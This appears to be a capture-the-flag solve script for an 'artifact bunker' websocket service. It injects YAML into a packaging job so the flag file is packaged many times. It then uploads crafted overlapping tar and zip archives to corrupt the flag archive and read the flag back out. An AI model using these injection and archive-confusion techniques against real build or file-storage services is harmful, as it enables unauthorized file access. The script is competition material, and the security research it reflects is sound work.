from urllib import parse
from websockets.sync.client import connect
import base64
import urllib.parse
import tarfile
import io
import random
import re

# seed for consistent compression size
random.seed(0)

URL = "ws://localhost:5555/ws/"
# URL = "ws://artifact-bunker-6qh4dbttgztzy.shellweplayaga.me/ws/"
TICKET = "ticket{ticketgoeshere}"

class BunkerClient:
    def __init__(self, url: str, ticket: str):
        self.ws = connect(url, subprotocols=[parse.quote(ticket)])

    def get_file(self, path: str):
        self.ws.send(f"download {path}")
        return self.ws.recv()

    def save_file(self, path: str):
        result = self.get_file(path)

        if "file" in result:
            [_, name, content] = result.split(" ")
            f = open(name, "wb")
            f.write(base64.b64decode(content))

        return result

    def list_files(self, path: str):
        self.ws.send(f"list {path}")
        return self.ws.recv()

    def clean_all(self):
        self.ws.send(f"clean-all")
        return self.ws.recv()

    def run_job(self, p1: str, p2: str):
        self.ws.send(f"job {p1} {p2}")
        return self.ws.recv()

    def upload_file(self, name: str, content_as_b64: str):
        self.ws.send(f"upload {name} {content_as_b64}")
        return self.ws.recv()

    def upload_file_from(self, name: str, src: str):
        return self.upload_file(name, base64.b64encode(open(src, "rb").read()).decode())


client = BunkerClient(URL, TICKET)

# YAML injection to get large tar file with flag contents at /data/flag.tar
print(client.run_job('package', urllib.parse.quote('''flag"
      artifacts:
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
        - "flag.txt"
    - name: "ignore''')))

# make large zip file to overwrite part of flag tar
# use random bytes to prevent compression from shrinking file too much
zip1_fo = io.BytesIO(random.randbytes(17592)) # (we eyeballed the offset until it was correct)
zip1_ti = tarfile.TarInfo(name='z' * 1585) # use large filename to hold EOCD of second zip
zip1_ti.size = len(zip1_fo.getvalue())
# use flag.tar.tar so that it partially overwrites flag content tarfile as a zip at flag.tar
with tarfile.open('flag.tar.tar', 'w') as tar:
    tar.addfile(zip1_ti, zip1_fo)

print(client.upload_file_from("flag.tar.tar", "flag.tar.tar"))

# go file properly creates flag.tar.zip with entries that have null bytes in filenames
# go build zip.go
# this zip file overwrites beginning of first zip, 
# with file entry name overwriting central directory of first zip
print(client.upload_file_from("flag.tar.zip", "flag.tar.zip"))

# confirm file exists
# print(client.list_files('flag.tar'))

# get flag
files = client.get_file('flag.tar/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')

b64 = files.split(' ')[-1]
data = base64.b64decode(b64)

# Regex pattern to search for flag
pattern = b"flug{.*?}|flag{.*?}"
matches = re.search(pattern, data)

if matches:
    print("flag:", matches.group())
else:
    print("No flag found.")

client.ws.close()   